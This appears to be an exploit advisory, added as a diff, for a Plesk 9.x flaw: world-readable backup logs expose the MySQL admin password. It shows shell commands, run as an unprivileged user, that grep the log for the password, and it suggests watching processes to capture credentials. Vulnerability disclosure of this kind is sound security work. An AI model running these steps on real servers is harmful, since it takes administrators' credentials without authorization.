@@ -1,0 +1,38 @@
+# Exploit Title: PLESK 9.x insecure directory permission ( admin password
+revealed )
+# Date: 25/04/2012
+# Author: Nicolas Krassas , twitter.com/dinosn
+# Software Link: www.*parallels*.com/*plesk*/
+# Version: 9.x
+# Tested on: ubuntu / centos
+
+During backup procedures, PLESK panel is keeping a detailed log of the
+process under /opt/psa/PMM/sessions in Debian/Ubuntu installations and
+/usr/local/psa/PMM/sessions in Centos under the directory with the current
+date.  A detailed log file is created with the name psadump.log, with
+readable permissions for everyone.  The file will reveal the admin password
+used from the backup process to dump the mysql databases from the sites
+being backed up.
+
+It's possible to locate data also under the sessions directory from
+incomplete/crashed backup sessions where the log files are not safely
+removed from the system.
+
+e.g.:
+
+$ id
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+$ cd /opt/psa/PMM/sessions
+$ ls -Fal
+total 32
+drwxr-xr-x  8 root root 4096 2012-04-25 21:42 ./
+drwxr-xr-x 10 root root 4096 2009-12-03 22:07 ../
+drwxr-xr-x  3 root root 4096 2012-04-25 22:12 2012-04-25-211250.973/
+$ cat 2012-04-25-211250.973/psadump.log | grep admin
+18:52:26 INFO  Executing bundle producer: '/usr/bin/mysqldump -h
+'localhost' -u 'admin' -p' PASSOWORD ' -P '3306' --quick --quote-names
+--add-drop-table --default-character-set=utf8 --set-charset 'DB'' in
+
+Old but I didn't see it listed, another way is to constantly monitor the
+system for the mysqldump process using a simple bash script to get the
+credentials as the process is running in the scheduled plesk backups.
